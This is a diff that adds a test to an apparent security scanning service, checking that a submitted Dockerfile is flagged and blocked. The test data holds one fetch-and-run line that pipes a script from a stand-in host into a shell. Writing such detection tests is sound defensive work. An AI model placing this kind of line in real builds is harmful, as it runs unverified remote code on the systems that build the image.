@@ -94,6 +94,17 @@ def test_components_are_enriched_with_stored_verdicts(client, admin_token):
     assert items[0]["decision"] == "block" and items[0]["scan_id"]
 
 
+def test_submitted_dockerfiles_are_linted(client, admin_token):
+    project = _create(client, admin_token)
+    dockerfile = "\n".join(["FROM python:3.12", "RUN wget -qO- https://x.invalid/i.sh | sh", ""])
+    files = {**CLEAN, "Dockerfile": dockerfile}
+    scan = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token),
+                       json={"files": files}).json()
+    codes = {f["code"] for f in scan["summary"]["findings"]}
+    assert {"DOCKERFILE_CURL_PIPE_SHELL", "DOCKERFILE_ROOT_USER", "DOCKERFILE_UNPINNED_BASE"} <= codes
+    assert scan["decision"] == "block"
+
+
 def test_clean_manifest_allows(client, admin_token):
     project = _create(client, admin_token)
     scan = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token),
